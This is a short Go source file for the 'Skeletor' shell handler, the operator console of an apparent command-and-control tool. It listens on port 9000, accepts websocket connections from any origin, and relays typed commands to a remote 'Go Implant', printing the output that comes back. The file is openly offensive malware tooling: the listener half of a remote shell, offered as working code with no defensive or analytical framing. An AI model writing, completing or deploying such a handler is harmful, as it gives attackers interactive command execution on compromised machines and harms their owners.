// shell_handler.go
package shell_handler

import (
	"bufio"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"

	"github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool { return true }, // Allow connections from anywhere
}

func main() {
	port := "9000"
	fmt.Printf("[*] Skeletor Shell Handler listening on 0.0.0.0:%s\n", port)

	http.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
		conn, err := upgrader.Upgrade(w, r, nil)
		if err != nil {
			log.Printf("Upgrade error: %v", err)
			return
		}
		defer conn.Close()

		remoteAddr := r.RemoteAddr
		fmt.Printf("\n[+] Connection received from %s\n", remoteAddr)

		// Create a scanner for terminal input
		scanner := bufio.NewScanner(os.Stdin)

		for {
			fmt.Print("skeletor-shell> ")
			if !scanner.Scan() {
				break
			}

			command := strings.TrimSpace(scanner.Text())
			if command == "" {
				continue
			}

			if command == "exit" || command == "quit" {
				fmt.Println("[*] Closing session...")
				break
			}

			// 1. Send the command to the Go Implant
			err = conn.WriteMessage(websocket.TextMessage, []byte(command))
			if err != nil {
				fmt.Printf("[-] Write error: %v\n", err)
				break
			}

			// 2. Wait for the response
			_, response, err := conn.ReadMessage()
			if err != nil {
				fmt.Printf("[-] Read error: %v\n", err)
				break
			}

			// 3. Print the output from the implant
			fmt.Printf("\n%s\n", string(response))
		}
	})

	log.Fatal(http.ListenAndServe(":"+port, nil))
}
